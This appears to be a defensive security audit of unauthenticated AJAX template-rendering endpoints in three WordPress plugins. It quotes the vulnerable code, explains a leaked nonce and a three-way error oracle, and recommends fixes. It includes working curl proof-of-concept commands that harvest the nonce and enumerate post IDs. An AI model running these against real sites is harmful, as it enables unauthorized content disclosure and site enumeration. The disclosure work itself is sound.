# Unauthenticated Template Rendering Audit

**Date:** 2026-06-14
**Scope:** ElementsKit Lite, Premium Addons for Elementor, Spectra/UAG
**Focus:** Unauthenticated RCE, SSRF, Information Disclosure via AJAX template-rendering endpoints

---

## Executive Summary

| Plugin | Endpoint | Severity | Issue |
|--------|----------|----------|-------|
| ElementsKit Lite | `ekit_widgetarea_content` | **HIGH** | Nonce leaked on frontend; any published post's Elementor content rendered to unauthenticated users |
| Premium Addons | `get_elementor_template_content` | **MEDIUM** | Zero auth/nonce; renders any published post; 3-way error oracle leaks post existence and status |
| Premium Addons | `pa_get_posts` / `premium_get_search_results` | **LOW** | Nonce leaked on frontend; queries constrained to public post types via WP_Query |
| Spectra/UAG | `uagb_gf_shortcode` / `uagb_cf7_shortcode` | **NOT EXPLOITABLE** | Nonce restricted to block editor (admin only); `intval()` blocks shortcode injection |
| Spectra/UAG | `uagb_process_forms` | **LOW** | Frontend nonce; can trigger spam emails but destinations are hardcoded in block config |

**No unauthenticated RCE or SSRF was confirmed in any target.** The most significant findings are information disclosure and content-rendering abuse.

---

## Target 1: ElementsKit Lite -- Unauthenticated Widget Area Content Rendering

### Vulnerable Endpoint

**Action:** `wp_ajax_nopriv_ekit_widgetarea_content`
**File:** `plugins/src/elementskit-lite/modules/controls/widget-area-utils.php`, lines 11-12, 15-35

### Handler Code (Annotated)

```php
// Line 11-12: Registered for BOTH authenticated and unauthenticated users
add_action( 'wp_ajax_ekit_widgetarea_content', array( $this, 'ekit_widgetarea_content' ) );
add_action( 'wp_ajax_nopriv_ekit_widgetarea_content', array( $this, 'ekit_widgetarea_content' ) );

public function ekit_widgetarea_content() {
    // Line 17: Nonce check -- but nonce is publicly available (see below)
    if ( !isset($_POST['nonce']) || !wp_verify_nonce( sanitize_key( wp_unslash( $_POST['nonce'] ) ), 'ekit_pro' ) ) {
        wp_die();
    }

    $post_id = isset($_POST['post_id']) ? intval( $_POST['post_id'] ) : 0;

    // Line 23: Only published posts -- prevents draft/private leakage
    if ( 'publish' !== get_post_status( $post_id ) ) {
        wp_die();
    }

    // Line 29: Renders full Elementor content including shortcodes, unescaped
    echo str_replace( '#elementor', '', \ElementsKit_Lite\Utils::render_tab_content(
        \ElementsKit_Lite\Utils::render_elementor_content( $post_id ), $post_id
    ));
    wp_die();
}
```

### Nonce Leak -- The Critical Issue

**File:** `plugins/src/elementskit-lite/widgets/init/enqueue-scripts.php`, lines 97-105

```php
$config = apply_filters(
    'elementskit/common/localize_settings',
    [
        'ajaxurl' => admin_url( 'admin-ajax.php' ),
        'nonce'   => wp_create_nonce( 'ekit_pro' ),  // <-- LEAKED
    ]
);
wp_localize_script( 'elementskit-elementor', 'ekit_config', $config );
```

This runs on `elementor/frontend/after_enqueue_scripts` -- fires on **every frontend Elementor page** for **all visitors**, including unauthenticated users. The nonce appears in page HTML as:

```html
<script>var ekit_config = {"ajaxurl":"...\/admin-ajax.php","nonce":"<VALID_NONCE>"};</script>
```

### Content Rendering Chain

`render_elementor_content($post_id)` (in `helpers/utils.php`, line 328) calls:
```php
\Elementor\Plugin::instance()->frontend->get_builder_content_for_display( $content_id )
```

This renders the **full Elementor widget tree** including:
- All registered shortcodes via `do_shortcode()`
- All Elementor widget PHP `render()` methods
- Dynamic tags and custom fields

### Exploitation

**Severity: HIGH** (Information Disclosure + Potential Content Abuse)

**Attack flow:**
1. Fetch any Elementor page as an anonymous visitor
2. Extract `ekit_config.nonce` from page source
3. Call the AJAX endpoint with any published post ID

**PoC:**
```bash
# Step 1: Harvest nonce (unauthenticated)
NONCE=$(curl -s http://TARGET/ | grep -oP '"nonce":"[^"]+"' | head -1 | cut -d'"' -f4)

# Step 2: Render any published post's Elementor content
curl -s -X POST http://TARGET/wp-admin/admin-ajax.php \
  -d "action=ekit_widgetarea_content&nonce=${NONCE}&post_id=1"

# Step 3: Enumerate published post IDs
for i in $(seq 1 500); do
  RESP=$(curl -s -X POST http://TARGET/wp-admin/admin-ajax.php \
    -d "action=ekit_widgetarea_content&nonce=${NONCE}&post_id=${i}")
  [ -n "$RESP" ] && [ "$RESP" != "0" ] && echo "Post $i: has Elementor content"
done
```

### Impact Assessment

| Impact | Exploitable? | Notes |
|--------|-------------|-------|
| Render ANY published post content | YES | No post_type restriction -- pages, CPTs, WooCommerce products |
| Render private/draft posts | NO | `get_post_status() !== 'publish'` check blocks this |
| Execute shortcodes server-side | YES | `get_builder_content_for_display()` runs `do_shortcode()` |
| SSRF | NO | No URL-fetch based on user input |
| Direct RCE | NO | Attacker cannot inject code; only triggers rendering of existing content |
| RCE via shortcode chaining | CONDITIONAL | If a plugin registers a shortcode with `eval()` or file-include, and that shortcode is embedded in a published post's Elementor content, it would execute. This is a second-order risk. |

---

## Target 2: Premium Addons -- Unauthenticated Template Content

### Vulnerable Endpoint

**Action:** `wp_ajax_nopriv_get_elementor_template_content`
**File:** `plugins/src/premium-addons-for-elementor/includes/helpers/ajax-helper.php`, lines 178-216

### Handler Code (Annotated)

```php
public function get_template_content() {
    // NO NONCE CHECK AT ALL
    // NO AUTHENTICATION CHECK

    $template = isset( $_GET['templateID'] ) ? sanitize_text_field( wp_unslash( $_GET['templateID'] ) ) : '';
    $is_ID    = isset( $_GET['is_id'] ) ? filter_var( $_GET['is_id'], FILTER_VALIDATE_BOOLEAN ) : false;

    if ( empty( $template ) ) {
        wp_send_json_error( 'Empty Template ID' );
    }

    $post = get_post( $template );

    if ( ! $post ) {
        wp_send_json_error( 'Invalid Template ID' );  // Oracle: post does NOT exist
    }

    if ( 'publish' !== $post->post_status ) {
        // Checks author/admin for non-published -- but response leaks EXISTENCE
        $current_user_id = get_current_user_id();
        $is_author       = ( $current_user_id === (int) $post->post_author );
        $is_admin        = current_user_can( 'manage_options' );

        if ( ! $is_admin && ! $is_author ) {
            wp_send_json_error( 'Permission denied' );  // Oracle: post EXISTS but not published
        }
    }

    // Renders full Elementor content for ANY published post type
    $template_content = Helper_Functions::render_elementor_template( $template, $is_ID );

    if ( empty( $template_content ) || ! isset( $template_content ) ) {
        wp_send_json_error( 'Empty Content' );  // Oracle: published but no Elementor content
    }

    wp_send_json_success( array( 'template_content' => $template_content ) );
}
```

### Three-Way Error Oracle

The handler returns **three distinct error messages** that together reveal post existence and status:

| Response | Meaning |
|----------|---------|
| `{"success":false,"data":"Invalid Template ID"}` | Post ID does NOT exist |
| `{"success":false,"data":"Permission denied"}` | Post EXISTS but is private/draft/pending/trashed |
| `{"success":false,"data":"Empty Content"}` or success JSON | Post is published |

**Live-confirmed PoC:**
```bash
# Does not exist
curl -s "http://localhost:8880/wp-admin/admin-ajax.php?action=get_elementor_template_content&templateID=9999"
# => {"success":false,"data":"Invalid Template ID"}

# Exists but private
curl -s "http://localhost:8880/wp-admin/admin-ajax.php?action=get_elementor_template_content&templateID=3"
# => {"success":false,"data":"Permission denied"}

# Exists and published
curl -s "http://localhost:8880/wp-admin/admin-ajax.php?action=get_elementor_template_content&templateID=1"
# => {"success":false,"data":"Empty Content"}   (published, no Elementor data)
```

### Severity: MEDIUM

- **No nonce or authentication required whatsoever**
- Renders full Elementor content of any published post (any post type)
- Post existence and status enumeration for ALL post IDs
- No SSRF (no user-controlled URLs)
- No RCE (renders stored content only)

---

## Target 3: Premium Addons -- Search and Post Query Handlers

### `wp_ajax_nopriv_premium_get_search_results`

**File:** `plugins/src/premium-addons-for-elementor/includes/premium-template-tags.php`, line 1015

- **Nonce:** `pa-blog-widget-nonce` -- verified via `check_ajax_referer()`
- **Nonce exposure:** Created in `includes/assets-manager.php` lines 1069-1084, output via `wp_localize_script('premium-addons-js', 'PremiumSettings', ...)` on `elementor/frontend/after_register_scripts` -- **exposed on all frontend pages**
- **SQL injection:** `$_POST['query']` passed through `sanitize_text_field()` to `WP_Query`'s `s` parameter. WordPress ORM handles this safely. **No SQL injection.**
- **Severity: LOW** -- Unauthenticated users can execute search queries with a scraped nonce, but results are limited to public post data.

### `wp_ajax_nopriv_pa_get_posts`

**File:** `plugins/src/premium-addons-for-elementor/includes/premium-template-tags.php`, line 965

- Same nonce as above (`pa-blog-widget-nonce`)
- Loads widget settings from post meta via `doc_id`/`elem_id`, then runs `WP_Query`
- `$_POST['category']` is **unsanitized** (`phpcs:ignore` at line 975) but flows into `WP_Query` tax_query terms, not raw SQL
- **No SQL injection.** WP_Query handles taxonomy term sanitization.
- **Severity: LOW**

---

## Target 4: Spectra/UAG -- Shortcode Rendering Handlers

### `uagb_gf_shortcode` and `uagb_cf7_shortcode`

**File:** `plugins/src/ultimate-addons-for-gutenberg/classes/class-uagb-init-blocks.php`, lines 652-663, 933-944

```php
public function gf_shortcode() {
    check_ajax_referer( 'uagb_ajax_nonce', 'nonce' );
    $id = isset( $_POST['formId'] ) ? intval( $_POST['formId'] ) : 0;
    if ( $id && 0 !== $id && -1 !== $id ) {
        $data['html'] = do_shortcode( '[gravityforms id="' . $id . '" ajax="true"]' );
    }
    wp_send_json_success( $data );
}
```

### Assessment: NOT EXPLOITABLE

| Check | Result |
|-------|--------|
| Nonce `uagb_ajax_nonce` exposed to frontend? | **NO** -- only in `enqueue_block_editor_assets` (admin block editor) |
| Live test without nonce | Returns `-1` (nonce failure) -- confirmed |
| Shortcode injection via `formId`? | **NO** -- `intval()` converts `1"][exec id="` to integer `1` |
| Arbitrary shortcode execution? | **NO** -- shortcode string is hardcoded `[gravityforms id="<int>"]` |

**Severity: NOT EXPLOITABLE** -- The nonce is genuinely restricted to authenticated editor sessions.

### Other UAG nopriv Handlers

| Handler | Nonce | Frontend Exposed? | Risk |
|---------|-------|--------------------|------|
| `uagb_post_pagination_grid` | `uagb_grid_ajax_nonce` | YES (class-uagb-post-assets.php:885) | LOW -- public post data only |
| `uagb_get_posts` | `uagb_masonry_ajax_nonce` | YES (class-uagb-scripts-utils.php:78) | LOW -- public post data only |
| `uagb_process_forms` | `uagb_forms_ajax_nonce` | YES (class-uagb-post-assets.php:896) | LOW -- can trigger spam emails; destinations hardcoded in block config |
| Image gallery handlers | respective nonces | YES | INFORMATIONAL -- pagination rendering only |

---

## SSRF Assessment (All Plugins)

**No SSRF vectors found in any unauthenticated handler across all three plugins.**

- ElementsKit: No outbound HTTP requests in the nopriv handler
- Premium Addons: Only outbound call is to hardcoded `google.com/recaptcha/api/siteverify` via `wp_safe_remote_get()` (which blocks private IPs)
- Spectra/UAG: No user-controlled URLs in any nopriv handler

---

## RCE Assessment (All Plugins)

**No direct RCE found.** However, the content-rendering endpoints (ElementsKit and Premium Addons) call `get_builder_content_for_display()` which executes `do_shortcode()` on stored post content. This creates a **second-order RCE risk**:

If an attacker can store a malicious shortcode in a published post (e.g., via a stored XSS or a plugin that allows shortcode-like content in user-facing fields), the unauthenticated rendering endpoints would execute that shortcode server-side. This requires:
1. A published post containing a dangerous shortcode (e.g., `[php_snippet]`, `[insert_php]`)
2. A plugin that registers such a shortcode with `eval()` or `include()`
3. The attacker triggering the rendering endpoint for that post ID

This is a **chained/conditional vulnerability**, not directly exploitable in isolation.

---

## Recommendations

### ElementsKit Lite (HIGH priority)
1. Remove the `wp_ajax_nopriv_` registration (line 12) if unauthenticated rendering is not required
2. If it IS required, gate the nonce localization to logged-in users only
3. Add `current_user_can()` check as defense-in-depth

### Premium Addons (MEDIUM priority)
1. Add nonce verification to `get_template_content()`
2. Normalize error messages to prevent the 3-way existence oracle (return same error for "not found" and "permission denied")
3. Restrict `templateID` to `elementor_library` post type only

### Spectra/UAG (LOW priority -- well-secured)
1. Consider removing `wp_ajax_nopriv_` registrations for `uagb_gf_shortcode` and `uagb_cf7_shortcode` since the nonce is never available to unauthenticated users anyway (dead code path)
